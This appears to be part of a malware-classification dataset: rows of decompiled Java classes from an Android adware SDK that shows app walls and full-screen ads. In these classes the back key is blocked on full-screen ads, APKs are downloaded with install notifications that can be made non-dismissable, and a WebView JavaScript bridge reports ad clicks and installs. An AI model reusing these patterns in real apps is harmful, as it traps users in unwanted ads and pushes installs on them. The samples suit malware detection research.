layoutParams2.setMargins(com.fw.tzthree.d.n.a(this,10.0f),0,0,0);     textView.setLayoutParams(layoutParams2);     textView.setText(com.fw.tzthree.core.t.a().b(this));     textView.setTextSize(11.0f);     textView.setTextColor(Color.parseColor(""#999999""));     textView.getPaint().setFakeBoldText(true);     textView.setId(65670);     View view=new View(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(this,1.0f));     layoutParams3.setMargins(com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f),com.fw.tzthree.d.n.a(this,10.0f));     layoutParams3.addRule(3,65670);     view.setLayoutParams(layoutParams3);     view.setBackgroundColor(Color.parseColor(""#999999""));     view.setId(65671);     GridView gridView=new GridView(this);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-1,-2);     layoutParams4.setMargins(com.fw.tzthree.d.n.a(this,5.0f),0,com.fw.tzthree.d.n.a(this,5.0f),0);     layoutParams4.addRule(14);     layoutParams4.addRule(15);     layoutParams4.addRule(3,65671);     gridView.setLayoutParams(layoutParams4);     gridView.setSelector(new ColorDrawable(0));     gridView.setNumColumns(4);     gridView.setVerticalSpacing(com.fw.tzthree.d.n.a(this,10.0f));     gridView.setHorizontalSpacing(com.fw.tzthree.d.n.a(this,5.0f));     gridView.setGravity(17);     gridView.setId(65672);     this.d.addView(textView);     this.d.addView(view);     this.d.addView(gridView);     relativeLayout.addView(this.d);     this.c=new ScaleAnimation(1.0f,0.0f,1.0f,0.0f,1,0.5f,1,0.5f);     this.c.setDuration(240L);     this.c.setFillAfter(true);     this.c.setAnimationListener(new aa(this));     relativeLayout.setOnClickListener(new ab(this));     if (this.b != null && this.b.size() != 0) {       RelativeLayout.LayoutParams layoutParams5=(RelativeLayout.LayoutParams)this.d.getLayoutParams();       if (this.b.size() > 12) {         layoutParams5.height=com.fw.tzthree.d.n.a(this,320.0f);       }     }     this.a=new ah(this,this.b);     gridView.setAdapter((ListAdapter)this.a);     gridView.setOnItemClickListener(this);     setContentView(relativeLayout);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     b();   }   @Override protected void onDestroy(){     super.onDestroy();     if (this.f != null) {       unregisterReceiver(this.f);     }   }   @Override public void onItemClick(  AdapterView<?> adapterView,  View view,  int i,  long j){     Intent intent;     AppWallAdInfo appWallAdInfo=(AppWallAdInfo)adapterView.getAdapter().getItem(i);     if (appWallAdInfo != null) {       b(appWallAdInfo);       if (a(appWallAdInfo.getPackageName())) {         PackageManager packageManager=getPackageManager();         Intent intent2=new Intent();         try {           intent=packageManager.getLaunchIntentForPackage(appWallAdInfo.getPackageName());         }  catch (        ActivityNotFoundException e) {           e.printStackTrace();           intent=intent2;         }         startActivity(intent);         return;       }       if (!com.fw.tzthree.d.e.a(this)) {         Toast.makeText(this,com.fw.tzthree.d.j.bZ,1).show();         return;       }       AdSwitches a=com.fw.tzthree.d.aa.a(this,appWallAdInfo);       if (appWallAdInfo.getKind().intValue() == 2) {         if (!TextUtils.isEmpty(com.fw.tzthree.d.z.b(this,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bt,com.fw.tzthree.b.a.bo,com.fw.tzthree.b.a.bC))) {           c(appWallAdInfo);           return;         }         if (a == null || a.getClickDown() == null) {           d(appWallAdInfo);           return;         }  else         if (a.getClickDown().isOn()) {           c(appWallAdInfo);           return;         }  else {           d(appWallAdInfo);           return;         }       }       if (appWallAdInfo.getKind().intValue() != 1) {         if (appWallAdInfo.getKind().intValue() == 3) {           com.fw.tzthree.d.r.a(this,appWallAdInfo.getUrl());         }       }  else {         if (!TextUtils.isEmpty(com.fw.tzthree.d.z.b(this,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bt,com.fw.tzthree.b.a.bo,com.fw.tzthree.b.a.bC))) {           e(appWallAdInfo);           return;         }         if (a == null || a.getClickDown() == null) {           e(appWallAdInfo);         }  else         if (a.getClickDown().isOn()) {           a(appWallAdInfo);         }  else {           e(appWallAdInfo);         }       }     }   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i != 4) {       return super.onKeyDown(i,keyEvent);     }     if (this.c != null && this.d != null) {       this.d.startAnimation(this.c);     }     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwMA.code","public class FwMA extends Activity implements com.fw.tzthree.core.g {   List<TableplaqueAdInfo> a;   private View b;   private Activity c;   private void a(  Context context){     if (this.b == null) {       this.b=new AdView(context,this.a,this);       this.b.setBackgroundColor(Color.argb(60,0,0,0));     }     ((Activity)context).setContentView(this.b);   }   @Override public void a(){     finish();   }   public void a(  Activity activity){     this.c=activity;   }   @Override protected void onCreate(  Bundle bundle){     if (this.c == null) {       super.onCreate(bundle);       requestWindowFeature(1);       a((Activity)this);     }     this.a=((av)getIntent().getSerializableExtra(com.fw.tzthree.b.a.aX)).a();     a((Context)this.c);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwSActivity.code","public class FwSActivity extends Activity {   private void a(){     Bundle extras=getIntent().getExtras();     String string=extras.getString(com.fw.tzthree.b.a.bA);     int i=extras.getInt(com.fw.tzthree.b.a.bB,FwFSManager.COUNTDOWN_STYLE);     FullScreenAdInfo fullScreenAdInfo=(FullScreenAdInfo)extras.getSerializable(com.fw.tzthree.b.a.bC);     if (TextUtils.isEmpty(string) || fullScreenAdInfo == null) {       finish();     }  else {       addContentView(new FullScreenView(this,new aj(this),i,3600000L,false,string,fullScreenAdInfo),new ViewGroup.LayoutParams(-1,-1));     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     a();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i == 4) {       return true;     }     return super.onKeyDown(i,keyEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwWallAdListActivity.code","public class FwWallAdListActivity extends Activity implements AbsListView.OnScrollListener {   private RelativeLayout a;   private TextView b;   private ImageButton c;   private LinearLayout d;   private ListView e;   private r g;   private View h;   private String i;   private RelativeLayout m;   private String n;   private Context o;   private int r;   private int s;   private final int f=260;   private final int j=272;   private final int k=264;   private final int l=265;   private boolean p=true;   private boolean q=false;   private void a(){     new u(this).execute(new Void[0]);   }   private void a(  int i){     if (this.p) {       new w(this,i).execute(new Void[0]);     }   }   public void a(  List<AppWallAdInfo> list){     this.e=new ListView(this);     this.e.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     this.e.setOnItemClickListener(new v(this));     this.n=AppWallBusiness.a().getSetting(this,5).getResourcesAddr();     this.g=new r(this,this.n);     d();     this.e.addFooterView(this.h);     this.e.setAdapter((ListAdapter)this.g);     this.e.setOnScrollListener(this);     this.m.addView(this.e);     if (list.isEmpty()) {       this.e.removeFooterView(this.h);       return;     }     this.g.a(list);     if (this.g.getCount() <= 10) {       this.e.removeFooterView(this.h);     }   }   public void b(){     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.topMargin=com.fw.tzthree.d.n.a(this,20.0f);     layoutParams.addRule(14);     textView.setLayoutParams(layoutParams);     textView.setText(""æ­£åœ¨åŠ è½½"");     textView.setTextColor(Color.parseColor(""#999999""));     textView.setTextSize(2,18.0f);     textView.setId(272);     this.m.addView(textView);     ImageView imageView=new ImageView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.topMargin=com.fw.tzthree.d.n.a(this,10.0f);     layoutParams2.addRule(14);     layoutParams2.addRule(3,272);     imageView.setLayoutParams(layoutParams2);     AnimationDrawable animationDrawable=new AnimationDrawable();     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_1.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_2.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_3.png""),250);     animationDrawable.addFrame(com.fw.tzthree.d.g.b(this,50,10,""by_rloding_4.png""),250);     animationDrawable.setOneShot(false);     imageView.setImageDrawable(animationDrawable);     ((AnimationDrawable)imageView.getDrawable()).start();     this.m.addView(imageView);   }   public void c(){     RelativeLayout relativeLayout=new RelativeLayout(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.topMargin=com.fw.tzthree.d.n.a(this,20.0f);     relativeLayout.setLayoutParams(layoutParams);     relativeLayout.setGravity(1);     ImageView imageView=new ImageView(this);     imageView.setLayoutParams(new RelativeLayout.LayoutParams(-2,-2));     imageView.setImageBitmap(com.fw.tzthree.d.g.a(this,50,50,""by_mark.png""));     imageView.setId(264);     relativeLayout.addView(imageView);     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,264);     layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this,50.0f);     textView.setLayoutParams(layoutParams2);     textView.setText(""åŠ è½½å¤±è´¥ï¼�"");     textView.setTextColor(Color.parseColor(""#999999""));     textView.setTextSize(2,18.0f);     textView.setId(265);     relativeLayout.addView(textView);     TextView textView2=new TextView(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(3,265);     layoutParams3.addRule(1,264);     layoutParams3.leftMargin=com.fw.tzthree.d.n.a(this,10.0f);     textView2.setLayoutParams(layoutParams3);     textView2.setText(""è¯·æ£€æŸ¥æ‚¨çš„ç½‘ç»œé…�ç½®"");     textView2.setTextColor(Color.parseColor(""#999999""));     textView2.setTextSize(2,18.0f);     relativeLayout.addView(textView2);     this.m.addView(relativeLayout);   }   private void d(){     this.h=new RelativeLayout(this);     ProgressBar progressBar=new ProgressBar(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.setMargins(0,com.fw.tzthree.d.n.a(this.o,8.0f),0,com.fw.tzthree.d.n.a(this.o,8.0f));     layoutParams.addRule(14);     progressBar.setLayoutParams(layoutParams);     ((RelativeLayout)this.h).addView(progressBar);   }   private void e(){     this.a=new RelativeLayout(this);     this.a.setBackgroundColor(Color.rgb(83,189,76));     this.a.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.fw.tzthree.d.n.a(getApplicationContext(),53.3f)));     this.a.setId(260);     this.b=new TextView(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(13);     this.b.setLayoutParams(layoutParams);     this.b.setTextSize(22.0f);     this.b.setSingleLine(true);     this.b.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));     this.b.setTextColor(-1);     this.b.setTextSize(2,22.0f);     this.b.setText(""åº”ç”¨åˆ—è¡¨"");     this.c=new ImageButton(this);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this,50.3f),-1);     layoutParams2.addRule(15);     this.c.setLayoutParams(layoutParams2);     this.c.setImageBitmap(com.fw.tzthree.d.g.a(this,15,20,""back.png""));     this.c.setBackgroundColor(Color.alpha(0));     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed,R.attr.state_enabled},new ColorDrawable(Color.argb(50,0,0,0)));     this.c.setBackgroundDrawable(stateListDrawable);     this.c.setOnClickListener(new x(this));     this.a.addView(this.c);     this.a.addView(this.b);     this.d.addView(this.a);   }   @Override public void onBackPressed(){     super.onBackPressed();     finish();   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     Intent intent=getIntent();     this.o=getApplicationContext();     this.i=intent.getStringExtra(com.fw.tzthree.b.a.bc);     setTheme(R.style.Theme.Light);     requestWindowFeature(1);     this.d=new LinearLayout(this);     this.d.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));     this.d.setOrientation(1);     this.d.setGravity(1);     this.d.setBackgroundColor(-1);     e();     this.m=new RelativeLayout(this);     this.m.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.d.addView(this.m);     a();     setContentView(this.d);   }   @Override protected void onResume(){     super.onResume();   }   @Override public void onScroll(  AbsListView absListView,  int i,  int i2,  int i3){     this.s=i + i2;     this.r=i3;   }   @Override public void onScrollStateChanged(  AbsListView absListView,  int i){     if (this.r == this.s && i == 0 && !this.q) {       this.q=true;       a(this.e.getCount());     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\FwWebActivity.code","public class FwWebActivity extends Activity {   private AdInfo a;   private int b;   @Override @SuppressLint({""JavascriptInterface""}) protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     Intent intent=getIntent();     this.a=(AdInfo)intent.getSerializableExtra(com.fw.tzthree.b.a.aX);     this.b=intent.getIntExtra(com.fw.tzthree.b.a.ba,0);     String url=this.a.getUrl();     LinearLayout linearLayout=new LinearLayout(this);     linearLayout.setOrientation(1);     linearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     ProgressWebView progressWebView=new ProgressWebView(this);     progressWebView.setLayoutParams(new LinearLayout.LayoutParams(-1,-1,1.0f));     progressWebView.addJavascriptInterface(new JsInterface(this,this.a,com.fw.tzthree.core.y.getCommonBusiness(getApplicationContext(),this.b)),com.fw.tzthree.b.a.O);     progressWebView.loadUrl(url);     progressWebView.setWebViewClient(new al(this));     linearLayout.addView(progressWebView);     setContentView(linearLayout);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\g.code","public class g implements View.OnClickListener {   final FwAdDetailActivity a;   public g(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public void onClick(  View view){     RelativeLayout relativeLayout;     relativeLayout=this.a.f;     relativeLayout.removeAllViews();     this.a.g();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\h.code","public class h implements AdapterView.OnItemClickListener {   final FwAdDetailActivity a;   public h(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public void onItemClick(  AdapterView<?> adapterView,  View view,  int i,  long j){     l lVar;     Intent intent;     l lVar2;     String str;     String str2;     String str3;     String str4;     lVar=this.a.z;     if (i == lVar.getCount()) {       intent=new Intent(this.a,(Class<?>)FwWallAdListActivity.class);       String str5=com.fw.tzthree.b.a.bc;       str3=this.a.ab;       intent.putExtra(str5,str3);       intent.putExtra(com.fw.tzthree.b.a.ba,5);       String str6=com.fw.tzthree.b.a.bf;       str4=this.a.M;       intent.putExtra(str6,str4);     }  else {       intent=new Intent(this.a,(Class<?>)FwAdDetailActivity.class);       String str7=com.fw.tzthree.b.a.aX;       lVar2=this.a.z;       intent.putExtra(str7,lVar2.getItem(i));       intent.putExtra(com.fw.tzthree.b.a.ba,5);       String str8=com.fw.tzthree.b.a.bc;       str=this.a.ab;       intent.putExtra(str8,str);       String str9=com.fw.tzthree.b.a.bf;       str2=this.a.M;       intent.putExtra(str9,str2);     }     this.a.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\i.code","public class i implements View.OnClickListener {   final FwAdDetailActivity a;   public i(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   @Override public void onClick(  View view){     Stack stack;     Stack stack2;     Stack stack3;     stack=FwAdDetailActivity.O;     if (stack != null) {       stack2=FwAdDetailActivity.O;       Iterator it=stack2.iterator();       while (it.hasNext()) {         ((Activity)it.next()).finish();       }       stack3=FwAdDetailActivity.O;       stack3.clear();     }     this.a.finish();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\j.code","class j implements View.OnClickListener {   final AdDetailActivity$DownloadProgressReceiver a;   public j(  AdDetailActivity$DownloadProgressReceiver adDetailActivity$DownloadProgressReceiver){     this.a=adDetailActivity$DownloadProgressReceiver;   }   @Override public void onClick(  View view){     File file;     String str;     AdInfo adInfo;     file=this.a.b;     this.a.a.startActivity(com.fw.tzthree.d.r.a(file));     this.a.a.T=new Notification(R.drawable.stat_sys_download,""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",com.fw.tzthree.d.ab.a());     StringBuilder sb=new StringBuilder();     str=this.a.a.S;     StringBuilder append=sb.append(str);     adInfo=this.a.a.Z;     SmartImageTask smartImageTask=new SmartImageTask(this.a.a.getApplicationContext(),new WebImage(append.append(adInfo.getIcon()).toString()));     smartImageTask.setOnCompleteHandler(new k(this));     new Thread(smartImageTask).start();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\JsInterface.code","public class JsInterface<T extends AdInfo> {   private AdInfo a;   private com.fw.tzthree.core.y<T> b;   private Context c;   public JsInterface(  Context context,  AdInfo adInfo,  com.fw.tzthree.core.y<T> yVar){     this.a=adInfo;     this.b=yVar;     this.c=context;   }   @JavascriptInterface public void onAdClicked(){     com.fw.tzthree.d.s.a(""on Web AdClicked"");     if (this.b != null) {       this.b.postActionRequest(this.c,this.a,4);     }   }   @JavascriptInterface public void onAdClicked(  String str){     com.fw.tzthree.d.r.a(this.c,str);     if (this.b != null) {       this.b.postActionRequest(this.c,this.a,4);     }   }   @JavascriptInterface public void onAdInstall(){     if (this.b != null) {       this.b.postActionRequest(this.c,this.a,7);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\k.code","class k extends SmartImageTask.OnCompleteHandler {   final j a;   public k(  j jVar){     this.a=jVar;   }   @Override public void onComplete(  Bitmap bitmap){     File file;     Notification notification;     AdInfo adInfo;     Notification notification2;     AdInfo adInfo2;     Notification notification3;     NotificationManager notificationManager;     AdInfo adInfo3;     int i;     Notification notification4;     Notification notification5;     Bitmap bitmap2;     Notification notification6;     Notification notification7;     Bitmap bitmap3;     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     file=this.a.a.b;     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive"");     PendingIntent activity=PendingIntent.getActivity(this.a.a.a.getApplicationContext(),new Random().nextInt(1000),intent,134217728);     notification=this.a.a.a.T;     Context applicationContext=this.a.a.a.getApplicationContext();     adInfo=this.a.a.a.Z;     notification.setLatestEventInfo(applicationContext,adInfo.getAppName(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",activity);     if (bitmap != null) {       this.a.a.a.U=bitmap;       int a=com.fw.tzthree.d.n.a(this.a.a.a.getApplicationContext(),45.0f);       FwAdDetailActivity fwAdDetailActivity=this.a.a.a;       bitmap2=this.a.a.a.U;       fwAdDetailActivity.U=com.fw.tzthree.d.n.a(bitmap2,a,a);       Context applicationContext2=this.a.a.a.getApplicationContext();       notification6=this.a.a.a.T;       com.fw.tzthree.d.u.a(View.inflate(applicationContext2,notification6.contentView.getLayoutId(),null));       notification7=this.a.a.a.T;       RemoteViews remoteViews=notification7.contentView;       bitmap3=this.a.a.a.U;       remoteViews.setImageViewBitmap(R.id.icon,bitmap3);     }     notification2=this.a.a.a.T;     notification2.icon=R.drawable.stat_sys_download_done;     FwAdDetailActivity fwAdDetailActivity2=this.a.a.a;     adInfo2=this.a.a.a.Z;     AdSwitches a2=com.fw.tzthree.d.aa.a(fwAdDetailActivity2,adInfo2);     if (a2 == null || a2.getUninstallBar() == null || !a2.getUninstallBar().isOn()) {       notification3=this.a.a.a.T;       notification3.flags=16;     }  else {       notification5=this.a.a.a.T;       notification5.flags=32;     }     this.a.a.a.R=(NotificationManager)this.a.a.a.getSystemService(""notification"");     notificationManager=this.a.a.a.R;     adInfo3=this.a.a.a.Z;     int intValue=3038375 + adInfo3.getAdId().intValue();     i=this.a.a.a.aa;     int i2=intValue + (i * 1000);     notification4=this.a.a.a.T;     notificationManager.notify(i2,notification4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\l.code","public class l extends BaseAdapter {   List<AppWallAdInfo> a;   final FwAdDetailActivity b;   public l(  FwAdDetailActivity fwAdDetailActivity,  List<AppWallAdInfo> list){     AdInfo adInfo;     com.fw.tzthree.core.y yVar;     AdInfo adInfo2;     this.b=fwAdDetailActivity;     this.a=list;     ArrayList arrayList=new ArrayList();     for (    AppWallAdInfo appWallAdInfo : list) {       int intValue=appWallAdInfo.getAdId().intValue();       adInfo=fwAdDetailActivity.Z;       if (intValue != adInfo.getAdId().intValue()) {         yVar=fwAdDetailActivity.W;         Context applicationContext=fwAdDetailActivity.getApplicationContext();         adInfo2=fwAdDetailActivity.Z;         if (yVar.isInstalled(applicationContext,adInfo2.getPackageName())) {         }       }       arrayList.add(appWallAdInfo);     }     this.a.removeAll(arrayList);   }   @Override public AppWallAdInfo getItem(  int i){     return this.a.get(i);   }   @Override public int getCount(){     if (this.a.size() >= 5) {       return 4;     }     return this.a.size();   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     n nVar;     Drawable drawable;     String str;     int i2;     List list;     RelativeLayout relativeLayout;     RelativeLayout relativeLayout2;     RelativeLayout relativeLayout3;     RelativeLayout relativeLayout4;     RelativeLayout relativeLayout5;     RelativeLayout relativeLayout6;     if (view == null) {       n nVar2=new n(this,null);       this.b.g=new RelativeLayout(this.b);       AbsListView.LayoutParams layoutParams=new AbsListView.LayoutParams(-1,com.fw.tzthree.d.n.a(this.b,60.0f));       relativeLayout=this.b.g;       relativeLayout.setLayoutParams(layoutParams);       nVar2.a=new SmartImageView(this.b);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.b,46.6f),com.fw.tzthree.d.n.a(this.b,46.6f));       layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this.b,8.0f);       layoutParams2.rightMargin=com.fw.tzthree.d.n.a(this.b,8.0f);       layoutParams2.topMargin=com.fw.tzthree.d.n.a(this.b,10.0f);       layoutParams2.bottomMargin=com.fw.tzthree.d.n.a(this.b,10.0f);       layoutParams2.addRule(15);       nVar2.a.setLayoutParams(layoutParams2);       nVar2.a.setId(256);       nVar2.d=new TextView(this.b);       RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.b,60.0f),com.fw.tzthree.d.n.a(this.b,30.0f));       layoutParams3.addRule(11);       layoutParams3.addRule(15);       layoutParams3.rightMargin=com.fw.tzthree.d.n.a(this.b,8.0f);       nVar2.d.setLayoutParams(layoutParams3);       nVar2.d.setId(257);       nVar2.d.setText(""è¯¦æƒ…"");       nVar2.d.setTextColor(-1);       nVar2.d.setTextSize(2,14.0f);       nVar2.d.setGravity(17);       nVar2.d.setBackgroundDrawable(new ColorDrawable(Color.rgb(83,189,76)));       nVar2.e=new CheckBox(this.b);       RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);       layoutParams4.addRule(15);       layoutParams4.addRule(0,257);       layoutParams4.rightMargin=com.fw.tzthree.d.n.a(this.b,10.0f);       nVar2.e.setLayoutParams(layoutParams4);       nVar2.e.setId(262);       nVar2.e.setChecked(true);       nVar2.e.setFocusable(false);       nVar2.b=new TextView(this.b);       RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);       layoutParams5.addRule(6,256);       layoutParams5.addRule(1,256);       layoutParams5.addRule(0,257);       nVar2.b.setLayoutParams(layoutParams5);       nVar2.b.setTextSize(2,14.0f);       nVar2.b.setTextColor(Color.rgb(78,78,78));       nVar2.b.setSingleLine(true);       nVar2.b.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));       nVar2.b.setText(""LINE"");       nVar2.b.setId(258);       nVar2.c=new TextView(this.b);       RelativeLayout.LayoutParams layoutParams6=new RelativeLayout.LayoutParams(-2,-2);       layoutParams6.addRule(1,256);       layoutParams6.addRule(3,258);       layoutParams6.addRule(0,262);       nVar2.c.setLayoutParams(layoutParams6);       nVar2.c.setTextColor(Color.rgb(101,101,101));       nVar2.c.setTextSize(2,14.0f);       nVar2.c.setSingleLine(true);       nVar2.c.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));       relativeLayout2=this.b.g;       relativeLayout2.addView(nVar2.a);       relativeLayout3=this.b.g;       relativeLayout3.addView(nVar2.b);       relativeLayout4=this.b.g;       relativeLayout4.addView(nVar2.c);       relativeLayout5=this.b.g;       relativeLayout5.addView(nVar2.d);       relativeLayout6=this.b.g;       relativeLayout6.addView(nVar2.e);       view=this.b.g;       view.setTag(nVar2);       nVar=nVar2;     }  else {       nVar=(n)view.getTag();     }     AppWallAdInfo appWallAdInfo=this.a.get(i);     SmartImageView smartImageView=nVar.a;     drawable=this.b.N;     smartImageView.setImageDrawable(drawable);     SmartImageView smartImageView2=nVar.a;     StringBuilder sb=new StringBuilder();     str=this.b.M;     smartImageView2.setImageUrl(sb.append(str).append(appWallAdInfo.getIcon()).toString());     nVar.b.setText(appWallAdInfo.getAppName());     nVar.c.setText(appWallAdInfo.getRecommend());     i2=this.b.Q;     if (1 != i2) {       nVar.e.setChecked(false);     }  else     if (1 == appWallAdInfo.getHasBoundAd()) {       nVar.e.setChecked(true);       list=this.b.P;       list.add(appWallAdInfo);     }  else {       nVar.e.setChecked(false);     }     nVar.e.setOnCheckedChangeListener(new m(this,appWallAdInfo));     return view;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\m.code","class m implements CompoundButton.OnCheckedChangeListener {   final AppWallAdInfo a;   final l b;   public m(  l lVar,  AppWallAdInfo appWallAdInfo){     this.b=lVar;     this.a=appWallAdInfo;   }   @Override public void onCheckedChanged(  CompoundButton compoundButton,  boolean z){     List list;     List list2;     List list3;     List list4;     if (z) {       list3=this.b.b.P;       if (list3.contains(this.a)) {         return;       }       list4=this.b.b.P;       list4.add(this.a);       return;     }     list=this.b.b.P;     if (list.contains(this.a)) {       list2=this.b.b.P;       list2.remove(this.a);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\n.code","class n {   public SmartImageView a;   public TextView b;   public TextView c;   public TextView d;   public CheckBox e;   final l f;   private n(  l lVar){     this.f=lVar;   }   public n(  l lVar,  a aVar){     this(lVar);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\o.code","public class o extends BaseAdapter {   final FwAdDetailActivity a;   private List<String> b;   public o(  FwAdDetailActivity fwAdDetailActivity,  List<String> list){     this.a=fwAdDetailActivity;     this.b=list;   }   @Override public int getCount(){     return this.b.size();   }   @Override public Object getItem(  int i){     return this.b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     p pVar;     View view2;     String str;     if (view == null) {       p pVar2=new p(this,null);       RelativeLayout relativeLayout=new RelativeLayout(this.a);       relativeLayout.setLayoutParams(new AbsListView.LayoutParams(com.fw.tzthree.d.n.a(this.a,147.0f),com.fw.tzthree.d.n.a(this.a,244.0f)));       pVar2.a=new SmartImageView(this.a);       pVar2.a.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));       relativeLayout.addView(pVar2.a);       relativeLayout.setTag(pVar2);       pVar=pVar2;       view2=relativeLayout;     }  else {       pVar=(p)view.getTag();       view2=view;     }     String str2=this.b.get(i);     SmartImageView smartImageView=pVar.a;     StringBuilder sb=new StringBuilder();     str=this.a.M;     smartImageView.setImageUrl(sb.append(str).append(str2).toString());     return view2;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\p.code","class p {   public SmartImageView a;   final o b;   private p(  o oVar){     this.b=oVar;   }   public p(  o oVar,  a aVar){     this(oVar);   } } "
